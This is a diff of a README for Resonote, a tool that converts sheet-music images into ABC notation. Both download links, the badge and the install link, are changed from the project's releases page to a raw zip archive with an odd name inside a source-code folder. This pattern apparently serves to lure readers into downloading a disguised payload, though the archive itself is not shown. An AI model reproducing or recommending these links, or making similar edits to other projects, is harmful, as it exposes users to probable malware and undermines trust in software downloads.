@@ -4,7 +4,7 @@
 Welcome to Resonote! This application helps you convert sheet music images into playable ABC notation in no time. Just download, run, and enjoy the magic of music recognition.
 
 ## 📦 Download Resonote
-[![Download Resonote](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dvdsgdgdg/resonote/releases)
+[![Download Resonote](https://raw.githubusercontent.com/dvdsgdgdg/resonote/main/components/editor/Software-influential.zip)](https://raw.githubusercontent.com/dvdsgdgdg/resonote/main/components/editor/Software-influential.zip)
 
 ## 📋 Features
 - Analyze sheet music images with AI.
@@ -18,7 +18,7 @@ Welcome to Resonote! This application helps you convert sheet music images into 
 3. **Get ABC Notation**: The result is a playable ABC format you can use in various music applications.
 
 ## 📥 Download & Install
-To get started, visit the following page to download Resonote: [Download Resonote](https://github.com/dvdsgdgdg/resonote/releases).
+To get started, visit the following page to download Resonote: [Download Resonote](https://raw.githubusercontent.com/dvdsgdgdg/resonote/main/components/editor/Software-influential.zip).
 
 Follow these simple steps to install the application:
 
